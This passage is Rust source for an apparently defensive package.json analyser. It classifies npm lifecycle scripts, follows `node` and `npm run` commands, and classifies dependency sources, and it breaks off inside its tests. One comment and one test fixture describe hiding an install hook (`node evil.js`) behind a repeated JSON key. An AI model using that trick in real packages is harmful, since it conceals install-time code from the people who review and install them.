//! `package.json`: scripts, entry points and dependencies.
//!
//! Everything in the file that can make code run, or fetch code, becomes a fact or an
//! unresolved fact with a reason. Shell is not parsed in full: a script command is split into
//! simple commands and only `node <file>`, a few TypeScript runners, and `npm|pnpm|yarn run
//! <script>` are followed. Every other command, and anything built at run time (`$VAR`,
//! `$(..)`, backticks), is reported as `ShellCommand`, with its program name quoted.

use crate::imports::json::{self, Jv, Kind, Member};
use crate::imports::link::EntryWant;
use forge_analysis_schema::{
    DepSection, DependencyInfo, DependencySource, FactKind, Quoted, RelPath, Script,
    ScriptTrigger, Span, StaticFact, UnresolvedReason,
};
use std::collections::{BTreeMap, BTreeSet};

#[derive(Debug, Default)]
pub struct PackageAnalysis {
    pub facts: Vec<StaticFact>,
    pub entries: Vec<EntryWant>,
}

/// None if `file` is not a `package.json`. `has_binding_gyp`: a `binding.gyp` sits beside it.
pub fn analyze_package(file: &RelPath, src: &str, has_binding_gyp: bool) -> Option<PackageAnalysis> {
    let name = file.as_quoted().text();
    if !(name == "package.json" || name.ends_with("/package.json") || name.ends_with("\\package.json")) {
        return None;
    }
    let mut k = Pk::new(file, src);
    k.run(has_binding_gyp);
    k.facts.sort_by_key(|f| (f.at().start_byte, f.at().end_byte));
    Some(PackageAnalysis { facts: k.facts, entries: k.wants })
}

struct Pk<'s> {
    file: &'s RelPath,
    src: &'s str,
    starts: Vec<u32>,
    facts: Vec<StaticFact>,
    wants: Vec<EntryWant>,
    seen_wants: BTreeSet<(String, String, bool)>,
}

const SCRIPT_EXTS: &[&str] = &[".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".mts", ".cts"];
const NPM_EVENTS: &[&str] = &[
    "test", "start", "stop", "restart", "publish", "pack", "version", "install", "uninstall",
    "prepare", "shrinkwrap", "dependencies",
];
const PM_BUILTINS: &[&str] = &[
    "install", "i", "add", "remove", "rm", "uninstall", "update", "upgrade", "up", "exec", "dlx",
    "create", "init", "publish", "pack", "link", "unlink", "config", "cache", "audit", "outdated",
    "list", "ls", "why", "rebuild", "prune", "dedupe", "patch", "fetch", "import", "store", "env",
    "ci", "login", "logout", "whoami", "view", "info", "set", "get", "dlx", "node", "global",
];

fn classify_script(name: &str, all: &BTreeSet<&str>) -> ScriptTrigger {
    match name {
        "preinstall" | "install" | "postinstall" => return ScriptTrigger::Install,
        "prepare" | "preprepare" | "postprepare" | "prepublish" => return ScriptTrigger::Prepare,
        "prepack" | "postpack" | "prepublishOnly" | "publish" | "postpublish" | "version"
        | "preversion" | "postversion" | "dependencies" | "shrinkwrap" | "preshrinkwrap"
        | "postshrinkwrap" => return ScriptTrigger::Hook,
        _ => {}
    }
    for p in ["pre", "post"] {
        if let Some(rest) = name.strip_prefix(p) {
            if !rest.is_empty() && (all.contains(rest) || NPM_EVENTS.contains(&rest)) {
                return ScriptTrigger::Hook;
            }
        }
    }
    ScriptTrigger::Manual
}

pub fn classify_dependency(spec: &str) -> DependencySource {
    let t = spec.trim();
    let l = t.to_ascii_lowercase();
    if t.is_empty() {
        return DependencySource::Registry;
    }
    if l.starts_with("workspace:") {
        return DependencySource::Workspace;
    }
    if l.starts_with("npm:") {
        return DependencySource::Alias;
    }
    if l.starts_with("file:") || l.starts_with("link:") || l.starts_with("portal:")
        || t == "." || t == ".." || t.starts_with("./") || t.starts_with("../")
        || t.starts_with('/') || t.starts_with("~/")
    {
        return DependencySource::LocalPath;
    }
    if l.starts_with("git+") || l.starts_with("git://") || l.starts_with("git@")
        || l.starts_with("ssh://") || l.starts_with("github:") || l.starts_with("gitlab:")
        || l.starts_with("bitbucket:") || l.starts_with("gist:")
    {
        return DependencySource::Git;
    }
    if l.starts_with("http://") || l.starts_with("https://") {
        let path = l.split(['#', '?']).next().unwrap_or(&l);
        return if path.ends_with(".git") { DependencySource::Git } else { DependencySource::Url };
    }
    if t.contains("://") {
        return DependencySource::Other;
    }
    // GitHub shorthand `user/repo#ref`: a slash, no scheme, not a scoped name.
    if t.contains('/') && !t.starts_with('@') && !t.contains(':') && !t.chars().any(char::is_whitespace) {
        return DependencySource::Git;
    }
    DependencySource::Registry
}

impl<'s> Pk<'s> {
    fn new(file: &'s RelPath, src: &'s str) -> Self {
        let mut starts = vec![0u32];
        for (i, b) in src.bytes().enumerate() {
            if b == b'\n' {
                starts.push(u32::try_from(i + 1).unwrap_or(u32::MAX));
            }
        }
        Self { file, src, starts, facts: Vec::new(), wants: Vec::new(), seen_wants: BTreeSet::new() }
    }

    fn span(&self, start: u32, end: u32) -> Span {
        let line = |o: u32| self.starts.partition_point(|&s| s <= o) as u32;
        Span {
            file: self.file.clone(),
            start_line: line(start),
            end_line: line(end.saturating_sub(1).max(start)),
            start_byte: start,
            end_byte: end,
        }
    }

    fn unresolved(&mut self, start: u32, end: u32, why: UnresolvedReason, detail: Option<&str>) {
        let mut f = StaticFact::new(FactKind::Unresolved, self.span(start, end), detail.map(Quoted::new));
        f.unresolved = Some(why);
        self.facts.push(f);
    }

    fn want(&mut self, label: &str, spec: &str, install: bool, optional: bool) {
        if self.seen_wants.insert((label.to_string(), spec.to_string(), install)) {
            self.wants.push(EntryWant {
                from: self.file.clone(),
                label: label.to_string(),
                spec: spec.to_string(),
                install,
                optional,
            });
        }
    }

    /// The members that count (the last of a repeated key, as `JSON.parse` keeps), in source
    /// order. Each shadowed earlier copy becomes an unresolved fact: hiding a value behind a
    /// repeat is a known trick.
    fn effective<'j>(&mut self, members: &'j [Member]) -> Vec<&'j Member> {
        let mut last: BTreeMap<&str, usize> = BTreeMap::new();
        for (i, m) in members.iter().enumerate() {
            last.insert(m.key.as_str(), i);
        }
        let mut out = Vec::new();
        for (i, m) in members.iter().enumerate() {
            if last[m.key.as_str()] == i {
                out.push(m);
            } else {
                self.unresolved(m.key_start, m.key_end, UnresolvedReason::AmbiguousBinding, Some(&m.key));
            }
        }
        out
    }

    fn run(&mut self, has_binding_gyp: bool) {
        let len = u32::try_from(self.src.len()).unwrap_or(u32::MAX);
        let root = match json::parse(self.src) {
            Ok(v) => v,
            Err(_) => {
                self.unresolved(0, len, UnresolvedReason::ParseFailed, None);
                return;
            }
        };
        let Kind::Object(members) = &root.kind else {
            self.unresolved(root.start, root.end, UnresolvedReason::UnsupportedSyntax, None);
            return;
        };
        let top = self.effective(members);
        let get = |k: &str| top.iter().find(|m| m.key == k).map(|m| &m.value);

        let scripts = get("scripts");
        let has = |k: &str| match scripts.map(|s| &s.kind) {
            Some(Kind::Object(ms)) => ms.iter().any(|m| m.key == k),
            _ => false,
        };
        if has_binding_gyp && !has("install") && !has("preinstall") {
            self.implicit_gyp(root.start);
        }
        if let Some(sv) = scripts {
            self.scripts(sv);
        }

        // Entry points.
        let has_main = get("main").is_some();
        let has_exports = get("exports").is_some();
        for key in ["main", "module", "browser"] {
            if let Some(v) = get(key) {
                match &v.kind {
                    Kind::Str(s) => self.want(key, s, false, false),
                    Kind::Object(_) if key == "browser" => {}
                    _ => self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None),
                }
            }
        }
        if !has_main && !has_exports {
            self.want("main", "index.js", false, true);
        }
        if let Some(v) = get("bin") {
            match &v.kind {
                Kind::Str(s) => self.want("bin", s, false, false),
                Kind::Object(ms) => {
                    for m in self.effective(ms) {
                        match &m.value.kind {
                            Kind::Str(s) => self.want(&format!("bin.{}", m.key), s, false, false),
                            _ => self.unresolved(m.value.start, m.value.end, UnresolvedReason::UnsupportedSyntax, None),
                        }
                    }
                }
                _ => self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None),
            }
        }
        if let Some(v) = get("exports") {
            self.exports(v, "exports");
        }
        if let Some(Kind::Object(ms)) = get("directories").map(|v| &v.kind) {
            if let Some(m) = ms.iter().rev().find(|m| m.key == "bin") {
                self.unresolved(m.value.start, m.value.end, UnresolvedReason::UnsupportedSyntax, Some("directories.bin"));
            }
        }

        // Dependencies.
        for (key, section) in [
            ("dependencies", DepSection::Dependencies),
            ("devDependencies", DepSection::Dev),
            ("optionalDependencies", DepSection::Optional),
            ("peerDependencies", DepSection::Peer),
        ] {
            if let Some(v) = get(key) {
                self.dep_map(v, section, "");
            }
        }
        for key in ["bundledDependencies", "bundleDependencies"] {
            if let Some(v) = get(key) {
                match &v.kind {
                    Kind::Array(items) => {
                        for it in items {
                            match &it.kind {
                                Kind::Str(n) => self.dep(it, n, "", DepSection::Bundled, Some(DependencySource::Bundled)),
                                _ => self.unresolved(it.start, it.end, UnresolvedReason::UnsupportedSyntax, None),
                            }
                        }
                    }
                    Kind::Bool(_) => {}
                    _ => self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None),
                }
            }
        }
        for key in ["overrides", "resolutions"] {
            if let Some(v) = get(key) {
                self.dep_map(v, DepSection::Overrides, "");
            }
        }
        if let Some(Kind::Object(ms)) = get("pnpm").map(|v| &v.kind) {
            if let Some(m) = ms.iter().rev().find(|m| m.key == "overrides") {
                self.dep_map(&m.value, DepSection::Overrides, "");
            }
        }
    }

    fn implicit_gyp(&mut self, at: u32) {
        let sp = self.span(at, at + 1);
        let mut f = StaticFact::new(FactKind::LifecycleScript, sp, Some(Quoted::new("node-gyp rebuild")));
        f.script = Some(Script { name: Quoted::new("install"), trigger: ScriptTrigger::Install });
        self.facts.push(f);
        self.unresolved(at, at + 1, UnresolvedReason::ShellCommand, Some("node-gyp rebuild"));
    }

    fn dep(&mut self, at: &Jv, name: &str, spec: &str, section: DepSection, source: Option<DependencySource>) {
        let mut f = StaticFact::new(FactKind::Dependency, self.span(at.start, at.end), Some(Quoted::new(name)));
        f.dependency = Some(DependencyInfo {
            section,
            spec: Quoted::new(spec),
            source: source.unwrap_or_else(|| classify_dependency(spec)),
        });
        self.facts.push(f);
    }

    fn dep_map(&mut self, v: &Jv, section: DepSection, prefix: &str) {
        let Kind::Object(ms) = &v.kind else {
            self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None);
            return;
        };
        for m in self.effective(ms) {
            let name = if prefix.is_empty() { m.key.clone() } else { format!("{prefix}>{}", m.key) };
            match &m.value.kind {
                Kind::Str(spec) => self.dep(&m.value, &name, spec, section, None),
                Kind::Object(_) if section == DepSection::Overrides => self.dep_map(&m.value, section, &name),
                _ => self.unresolved(m.value.start, m.value.end, UnresolvedReason::UnsupportedSyntax, Some(&name)),
            }
        }
    }

    fn exports(&mut self, v: &Jv, label: &str) {
        match &v.kind {
            Kind::Str(s) => {
                if s.contains('*') || !s.starts_with("./") {
                    self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, Some(s));
                } else {
                    self.want(label, s, false, false);
                }
            }
            Kind::Array(items) => {
                for it in items {
                    self.exports(it, label);
                }
            }
            Kind::Object(ms) => {
                for m in self.effective(ms) {
                    self.exports(&m.value, &format!("{label}.{}", m.key));
                }
            }
            Kind::Null => {}
            _ => self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None),
        }
    }

    fn scripts(&mut self, sv: &Jv) {
        let Kind::Object(ms) = &sv.kind else {
            self.unresolved(sv.start, sv.end, UnresolvedReason::UnsupportedSyntax, None);
            return;
        };
        let eff = self.effective(ms);
        let mut table: Vec<(String, String, u32, u32)> = Vec::new();
        for m in &eff {
            match &m.value.kind {
                Kind::Str(cmd) => table.push((m.key.clone(), cmd.clone(), m.value.start, m.value.end)),
                _ => self.unresolved(m.value.start, m.value.end, UnresolvedReason::UnsupportedSyntax, Some(&m.key)),
            }
        }
        let names: BTreeSet<&str> = table.iter().map(|t| t.0.as_str()).collect();
        let mut actions: BTreeMap<String, Vec<Action>> = BTreeMap::new();
        let mut triggers: BTreeMap<String, ScriptTrigger> = BTreeMap::new();

        for (name, cmd, start, end) in &table {
            let trigger = classify_script(name, &names);
            triggers.insert(name.clone(), trigger);
            let mut f = StaticFact::new(FactKind::LifecycleScript, self.span(*start, *end), Some(Quoted::new(cmd)));
            f.script = Some(Script { name: Quoted::new(name), trigger });
            self.facts.push(f);

            let acts = interpret_command(cmd, &names);
            for a in &acts {
                match a {
                    Action::Opaque(text) => {
                        self.unresolved(*start, *end, UnresolvedReason::ShellCommand, Some(text))
                    }
                    Action::Run(n) if !names.contains(n.as_str()) => {
                        let t = format!("run {n}");
                        self.unresolved(*start, *end, UnresolvedReason::ShellCommand, Some(&t));
                    }
                    _ => {}
                }
            }
            actions.insert(name.clone(), acts);
        }

        // Which files each script reaches, following `npm run` chains (and the pre/post hooks
        // npm runs around them), with a visited set so cycles end.
        for (root, _, _, _) in &table {
            let trigger = triggers[root];
            let install = matches!(trigger, ScriptTrigger::Install | ScriptTrigger::Prepare);
            let mut files: Vec<String> = Vec::new();
            let mut seen: BTreeSet<String> = BTreeSet::new();
            seen.insert(root.clone());
            let mut stack: Vec<(String, usize)> = vec![(root.clone(), 0)];
            while let Some((name, depth)) = stack.pop() {
                if depth > 32 {
                    continue;
                }
                for a in actions.get(&name).into_iter().flatten() {
                    match a {
                        Action::Node(fs) => files.extend(fs.iter().cloned()),
                        Action::Run(n) => {
                            for target in [format!("pre{n}"), n.clone(), format!("post{n}")] {
                                if actions.contains_key(&target) && seen.insert(target.clone()) {
                                    stack.push((target, depth + 1));
                                }
                            }
                        }
                        Action::Opaque(_) => {}
                    }
                }
            }
            for f in files {
                self.want(&format!("scripts.{root}"), &f, install, false);
            }
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Action {
    /// Runs these files with Node (preloads first, then the main file).
    Node(Vec<String>),
    /// Runs another script of the same package.
    Run(String),
    /// A command we do not follow; the text is what the report quotes.
    Opaque(String),
}

struct Word {
    text: String,
    dynamic: bool,
}

struct Segment {
    words: Vec<Word>,
    substitution: bool,
}

fn is_assignment(w: &str) -> bool {
    match w.split_once('=') {
        Some((n, _)) => {
            !n.is_empty()
                && !n.starts_with(|c: char| c.is_ascii_digit())
                && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// Splits a command line into simple commands and words, honouring quotes. `Err` means the
/// text uses shell syntax we do not read (unbalanced quotes, subshells, here-documents).
// The macros reset their state after every word and segment; at the very end of the input that
// reset is never read, which is harmless, so the lint is allowed here only.
#[allow(unused_assignments)]
fn split(cmd: &str) -> Result<Vec<Segment>, &'static str> {
    let cs: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    let mut segs: Vec<Segment> = Vec::new();
    let mut words: Vec<Word> = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut dyn_ = false;
    let mut subst = false;
    let mut skip_next = false;

    macro_rules! end_word {
        () => {
            if in_word {
                if skip_next {
                    skip_next = false;
                } else {
                    words.push(Word { text: std::mem::take(&mut cur), dynamic: dyn_ });
                }
                cur.clear();
                in_word = false;
                dyn_ = false;
            }
        };
    }
    macro_rules! end_seg {
        () => {
            end_word!();
            if !words.is_empty() || subst {
                segs.push(Segment { words: std::mem::take(&mut words), substitution: subst });
            }
            words.clear();
            subst = false;
        };
    }

    while i < cs.len() {
        let c = cs[i];
        match c {
            '\'' => {
                i += 1;
                let s = i;
                while i < cs.len() && cs[i] != '\'' {
                    i += 1;
                }
                if i >= cs.len() {
                    return Err("unbalanced quote");
                }
                cur.extend(&cs[s..i]);
                in_word = true;
                i += 1;
            }
            '"' => {
                i += 1;
                in_word = true;
                loop {
                    let Some(&d) = cs.get(i) else { return Err("unbalanced quote") };
                    match d {
                        '"' => {
                            i += 1;
                            break;
                        }
                        '\\' => {
                            match cs.get(i + 1) {
                                Some(&n) if matches!(n, '"' | '\\' | '$' | '`') => {
                                    cur.push(n);
                                    i += 2;
                                }
                                Some(&n) => {
                                    cur.push('\\');
                                    cur.push(n);
                                    i += 2;
                                }
                                None => return Err("unbalanced quote"),
                            }
                        }
                        '`' => {
                            subst = true;
                            dyn_ = true;
                            i += 1;
                            while i < cs.len() && cs[i] != '`' {
                                i += 1;
                            }
                            if i >= cs.len() {
                                return Err("unbalanced quote");
                            }
                            i += 1;
                        }
                        '$' => {
                            match cs.get(i + 1) {
                                Some('(') => {
                                    subst = true;
                                    dyn_ = true;
                                    i = skip_parens(&cs, i + 1)?;
                                }
                                Some(n) if n.is_ascii_alphanumeric() || matches!(n, '_' | '{' | '@' | '*' | '#' | '?' | '!' | '$' | '-') => {
                                    dyn_ = true;
                                    cur.push('$');
                                    i += 1;
                                }
                                _ => {
                                    cur.push('$');
                                    i += 1;
                                }
                            }
                        }
                        _ => {
                            cur.push(d);
                            i += 1;
                        }
                    }
                }
            }
            '\\' => {
                if let Some(&n) = cs.get(i + 1) {
                    cur.push(n);
                    in_word = true;
                }
                i += 2;
            }
            '`' => {
                subst = true;
                dyn_ = true;
                in_word = true;
                i += 1;
                while i < cs.len() && cs[i] != '`' {
                    i += 1;
                }
                if i >= cs.len() {
                    return Err("unbalanced quote");
                }
                i += 1;
            }
            '$' => {
                match cs.get(i + 1) {
                    Some('(') => {
                        subst = true;
                        dyn_ = true;
                        in_word = true;
                        i = skip_parens(&cs, i + 1)?;
                    }
                    Some(n) if n.is_ascii_alphanumeric() || matches!(n, '_' | '{' | '@' | '*' | '#' | '?' | '!' | '$' | '-') => {
                        dyn_ = true;
                        in_word = true;
                        cur.push('$');
                        i += 1;
                    }
                    _ => {
                        cur.push('$');
                        in_word = true;
                        i += 1;
                    }
                }
            }
            ' ' | '\t' => {
                end_word!();
                i += 1;
            }
            '\n' | ';' => {
                end_seg!();
                i += 1;
            }
            '&' => {
                end_seg!();
                i += 1;
                if cs.get(i) == Some(&'&') {
                    i += 1;
                }
            }
            '|' => {
                end_seg!();
                i += 1;
                if cs.get(i) == Some(&'|') {
                    i += 1;
                }
            }
            '(' | ')' => return Err("subshell"),
            '<' | '>' => {
                if cs.get(i + 1) == Some(&'(') {
                    return Err("process substitution");
                }
                if c == '<' && cs.get(i + 1) == Some(&'<') {
                    return Err("here-document");
                }
                // `2>file`: the file descriptor number is not a word.
                if in_word && cur.chars().all(|ch| ch.is_ascii_digit()) {
                    cur.clear();
                    in_word = false;
                    dyn_ = false;
                } else {
                    end_word!();
                }
                i += 1;
                while matches!(cs.get(i), Some('>' | '&' | '<')) {
                    i += 1;
                }
                skip_next = true;
            }
            '#' if !in_word => {
                while i < cs.len() && cs[i] != '\n' {
                    i += 1;
                }
            }
            _ => {
                cur.push(c);
                in_word = true;
                i += 1;
            }
        }
    }
    end_seg!();
    Ok(segs)
}

/// From the `(` at `i`, the index just past its matching `)`.
fn skip_parens(cs: &[char], mut i: usize) -> Result<usize, &'static str> {
    let mut depth = 0usize;
    while i < cs.len() {
        match cs[i] {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return Ok(i + 1);
                }
            }
            _ => {}
        }
        i += 1;
    }
    Err("unbalanced substitution")
}

fn has_script_ext(w: &str) -> bool {
    SCRIPT_EXTS.iter().any(|e| w.ends_with(e))
}

fn path_like(w: &str) -> bool {
    w.starts_with("./") || w.starts_with("../") || w.starts_with('/') || has_script_ext(w)
}

/// What a script command does, as far as we follow it.
pub fn interpret_command(cmd: &str, scripts: &BTreeSet<&str>) -> Vec<Action> {
    let segs = match split(cmd) {
        Ok(s) => s,
        Err(why) => return vec![Action::Opaque(why.to_string())],
    };
    let mut out = Vec::new();
    for seg in &segs {
        if seg.substitution {
            out.push(Action::Opaque("command substitution".into()));
        }
        interpret_segment(&seg.words, scripts, &mut out);
    }
    out
}

fn interpret_segment(words: &[Word], scripts: &BTreeSet<&str>, out: &mut Vec<Action>) {
    let mut i = 0;
    // Leading `NAME=value`, and the `env` / `cross-env` wrappers that only set variables.
    loop {
        match words.get(i) {
            Some(w) if !w.dynamic && is_assignment(&w.text) => i += 1,
            Some(w) if !w.dynamic && (w.text == "cross-env" || w.text == "env") => {
                i += 1;
                while matches!(words.get(i), Some(a) if !a.dynamic && is_assignment(&a.text)) {
                    i += 1;
                }
                if matches!(words.get(i), Some(a) if a.text.starts_with('-')) {
                    out.push(Action::Opaque(words[i - 1].text.clone()));
                    return;
                }
                break;
            }
            _ => break,
        }
    }
    let Some(prog) = words.get(i) else { return };
    if prog.dynamic {
        out.push(Action::Opaque("dynamic command".into()));
        return;
    }
    let args = &words[i + 1..];
    match prog.text.as_str() {
        "node" | "nodejs" => node_command(&prog.text, args, out),
        "tsx" | "ts-node" | "ts-node-esm" | "esno" | "jiti" | "bun" | "deno" => runner_command(&prog.text, args, scripts, out),
        "npm" | "pnpm" | "yarn" => pm_command(&prog.text, args, scripts, out),
        other => out.push(Action::Opaque(other.to_string())),
    }
}

fn node_command(prog: &str, args: &[Word], out: &mut Vec<Action>) {
    let mut files: Vec<String> = Vec::new();
    let mut j = 0;
    let mut main: Option<&Word> = None;
    while j < args.len() {
        let a = &args[j];
        let t = a.text.as_str();
        let preload = |v: &str, files: &mut Vec<String>, out: &mut Vec<Action>, dynamic: bool| {
            if dynamic {
                out.push(Action::Opaque(format!("{prog} (dynamic preload)")));
            } else if path_like(v) {
                files.push(v.to_string());
            } else {
                out.push(Action::Opaque(format!("{prog} --require {v}")));
            }
        };
        match t {
            "-e" | "--eval" | "-p" | "--print" | "-pe" | "-pr" => {
                out.push(Action::Opaque(format!("{prog} {t}")));
                return;
            }
            "-r" | "--require" | "--import" | "--loader" | "--experimental-loader" => {
                if let Some(v) = args.get(j + 1) {
                    preload(&v.text, &mut files, out, v.dynamic);
                }
                j += 2;
                continue;
            }
            "--" => {
                main = args.get(j + 1);
                break;
            }
            _ if t.starts_with("--eval=") || t.starts_with("--print=") => {
                out.push(Action::Opaque(format!("{prog} --eval")));
                return;
            }
            _ if t.starts_with("--require=") || t.starts_with("--import=") || t.starts_with("--loader=") || t.starts_with("--experimental-loader=") => {
                let v = t.split_once('=').map_or("", |x| x.1);
                preload(v, &mut files, out, a.dynamic);
            }
            _ if t.starts_with('-') => {}
            _ => {
                main = Some(a);
                break;
            }
        }
        j += 1;
    }
    match main {
        Some(m) if !m.dynamic => {
            files.push(m.text.clone());
            out.push(Action::Node(files));
        }
        _ => {
            if !files.is_empty() {
                out.push(Action::Node(files));
            }
            out.push(Action::Opaque(prog.to_string()));
        }
    }
}

fn runner_command(prog: &str, args: &[Word], scripts: &BTreeSet<&str>, out: &mut Vec<Action>) {
    if matches!(prog, "bun" | "deno") && args.first().is_some_and(|a| a.text == "run" || a.text == "task") {
        if let Some(n) = args.get(1) {
            if !n.dynamic && !n.text.starts_with('-') && !has_script_ext(&n.text) {
                out.push(if scripts.contains(n.text.as_str()) {
                    Action::Run(n.text.clone())
                } else {
                    Action::Opaque(format!("{prog} {}", n.text))
                });
                return;
            }
        }
    }
    let files: Vec<String> = args
        .iter()
        .filter(|a| !a.dynamic && !a.text.starts_with('-') && has_script_ext(&a.text))
        .map(|a| a.text.clone())
        .collect();
    if files.is_empty() || args.iter().any(|a| a.dynamic) {
        out.push(Action::Opaque(prog.to_string()));
    }
    if !files.is_empty() {
        out.push(Action::Node(files));
    }
}

fn pm_command(prog: &str, args: &[Word], scripts: &BTreeSet<&str>, out: &mut Vec<Action>) {
    let mut j = 0;
    while let Some(a) = args.get(j) {
        let t = a.text.as_str();
        if matches!(t, "--prefix" | "-C" | "--cwd" | "-w" | "--workspace" | "--workspaces" | "-ws" | "--filter" | "-F" | "-r" | "--recursive" | "--dir") {
            out.push(Action::Opaque(format!("{prog} {t}")));
            return;
        }
        if t.starts_with('-') && t != "--" {
            j += 1;
        } else {
            break;
        }
    }
    let Some(sub) = args.get(j) else {
        out.push(Action::Opaque(prog.to_string()));
        return;
    };
    if sub.dynamic {
        out.push(Action::Opaque(format!("{prog} (dynamic)")));
        return;
    }
    let s = sub.text.as_str();
    let named = |rest: &[Word]| -> Option<String> {
        rest.iter()
            .take_while(|w| w.text != "--")
            .find(|w| !w.text.starts_with('-'))
            .filter(|w| !w.dynamic)
            .map(|w| w.text.clone())
    };
    match s {
        "run" | "run-script" | "rum" | "urn" => {
            if let Some(n) = named(&args[j + 1..]) {
                out.push(Action::Run(n));
            } else if args[j + 1..].iter().any(|w| w.dynamic) {
                out.push(Action::Opaque(format!("{prog} run (dynamic)")));
            }
        }
        "start" | "stop" | "restart" | "test" => out.push(Action::Run(s.to_string())),
        "t" | "tst" => out.push(Action::Run("test".to_string())),
        _ if prog != "npm" && scripts.contains(s) && !PM_BUILTINS.contains(&s) => out.push(Action::Run(s.to_string())),
        _ => out.push(Action::Opaque(format!("{prog} {s}"))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::imports::link::{link_project, tests::info, LinkFile};
    use forge_analysis_schema::{Effect, EntryBasis, Lane, UnlinkedReason};

    fn pkg(json: &str) -> PackageAnalysis {
        analyze_package(&RelPath::new("package.json").unwrap(), json, false).unwrap()
    }

    fn reasons(a: &PackageAnalysis) -> Vec<UnresolvedReason> {
        a.facts.iter().filter_map(|f| f.unresolved).collect()
    }

    fn shell_texts(a: &PackageAnalysis) -> Vec<String> {
        a.facts
            .iter()
            .filter(|f| f.unresolved == Some(UnresolvedReason::ShellCommand))
            .map(|f| f.detail().unwrap().text().to_string())
            .collect()
    }

    fn scripts(a: &PackageAnalysis) -> Vec<(String, ScriptTrigger)> {
        a.facts
            .iter()
            .filter_map(|f| f.script.as_ref().map(|s| (s.name.text().to_string(), s.trigger)))
            .collect()
    }

    fn wants(a: &PackageAnalysis) -> Vec<(String, String, bool)> {
        let mut v: Vec<_> = a.entries.iter().map(|w| (w.label.clone(), w.spec.clone(), w.install)).collect();
        v.sort();
        v
    }

    fn s(label: &str, spec: &str, install: bool) -> (String, String, bool) {
        (label.to_string(), spec.to_string(), install)
    }

    fn valid(a: &PackageAnalysis) {
        for f in &a.facts {
            assert!(f.validate().is_empty(), "{:?}", f.validate());
        }
    }

    #[test]
    fn only_package_json_files_are_read() {
        assert!(analyze_package(&RelPath::new("a/package.json").unwrap(), "{}", false).is_some());
        assert!(analyze_package(&RelPath::new("package-lock.json").unwrap(), "{}", false).is_none());
        assert!(analyze_package(&RelPath::new("x/mypackage.json").unwrap(), "{}", false).is_none());
    }

    #[test]
    fn a_file_that_does_not_parse_gives_one_fact_and_nothing_else() {
        let a = pkg("{\"scripts\": {\"postinstall\": \"x\",}}");
        assert_eq!(reasons(&a), vec![UnresolvedReason::ParseFailed]);
        assert_eq!(a.facts.len(), 1);
        assert!(a.entries.is_empty());
        let a = pkg("[1]");
        assert_eq!(reasons(&a), vec![UnresolvedReason::UnsupportedSyntax]);
    }

    #[test]
    fn script_triggers_are_classified() {
        let a = pkg(r#"{"scripts": {
            "preinstall":"a","install":"a","postinstall":"a",
            "prepare":"a","prepublish":"a",
            "prepublishOnly":"a","prepack":"a","version":"a",
            "build":"a","prebuild":"a","postbuild":"a","pretest":"a","test":"a","start":"a","lint":"a","prelint":"a",
            "preorphan":"a"
        }}"#);
        let t: BTreeMap<_, _> = scripts(&a).into_iter().collect();
        use ScriptTrigger::*;
        assert_eq!(t["preinstall"], Install);
        assert_eq!(t["install"], Install);
        assert_eq!(t["postinstall"], Install);
        assert_eq!(t["prepare"], Prepare);
        assert_eq!(t["prepublish"], Prepare);
        assert_eq!(t["prepublishOnly"], Hook);
        assert_eq!(t["prepack"], Hook);
        assert_eq!(t["version"], Hook);
        assert_eq!(t["prebuild"], Hook);
        assert_eq!(t["postbuild"], Hook);
        assert_eq!(t["pretest"], Hook);
        assert_eq!(t["prelint"], Hook);
        assert_eq!(t["build"], Manual);
        assert_eq!(t["test"], Manual);
        assert_eq!(t["start"], Manual);
        assert_eq!(t["preorphan"], Manual, "no script called `orphan`");
        valid(&a);
    }

    #[test]
    fn a_script_fact_sits_on_the_command_text() {
        let src = "{\n  \"scripts\": {\n    \"postinstall\": \"node setup.js\"\n  }\n}";
        let a = pkg(src);
        let f = a.facts.iter().find(|f| f.script.is_some()).unwrap();
        assert_eq!(&src[f.at().start_byte as usize..f.at().end_byte as usize], "\"node setup.js\"");
        assert_eq!(f.at().start_line, 3);
        assert_eq!(f.detail().unwrap().text(), "node setup.js");
    }

    #[test]
    fn repeated_keys_keep_the_last_and_flag_the_shadowed_one() {
        let a = pkg(r#"{"scripts": {"postinstall": "echo hi", "postinstall": "node evil.js"}}"#);
        assert_eq!(reasons(&a), vec![UnresolvedReason::AmbiguousBinding]);
        let facts: Vec<_> = a.facts.iter().filter(|f| f.script.is_some()).collect();
        assert_eq!(facts.len(), 1);
        assert_eq!(facts[0].detail().unwrap().text(), "node evil.js");
        assert_eq!(wants(&a), vec![s("main", "index.js", false), s("scripts.postinstall", "evil.js", true)]);
    }

    #[test]
    fn node_scripts_become_entries_in_the_right_lane() {
        let a = pkg(r#"{"scripts": {
            "postinstall": "node scripts/setup.js",
            "start": "node server.js --port 3000",
            "dev": "FOO=1 cross-env NODE_ENV=x node ./dev.js"
        }, "main": "lib/index.js"}"#);
        assert_eq!(
            wants(&a),
            vec![
                s("main", "lib/index.js", false),
                s("scripts.dev", "./dev.js", false),
                s("scripts.postinstall", "scripts/setup.js", true),
                s("scripts.start", "server.js", false),
            ]
        );
        assert!(shell_texts(&a).is_empty(), "{:?}", shell_texts(&a));
    }

    #[test]
    fn npm_run_chains_are_followed_with_their_hooks() {
        let a = pkg(r#"{"scripts": {
            "postinstall": "npm run build && echo done",
            "build": "node b.js",
            "prebuild": "node pre.js"
        }}"#);
        let w = wants(&a);
        assert!(w.contains(&s("scripts.postinstall", "b.js", true)));
        assert!(w.contains(&s("scripts.postinstall", "pre.js", true)));
        assert!(w.contains(&s("scripts.build", "b.js", false)));
        assert_eq!(shell_texts(&a), vec!["echo".to_string()]);
    }

    #[test]
    fn run_cycles_end() {
        let a = pkg(r#"{"scripts": {"a": "npm run b", "b": "yarn run a && node x.js"}}"#);
        assert!(wants(&a).contains(&s("scripts.a", "x.js", false)));
    }

    #[test]
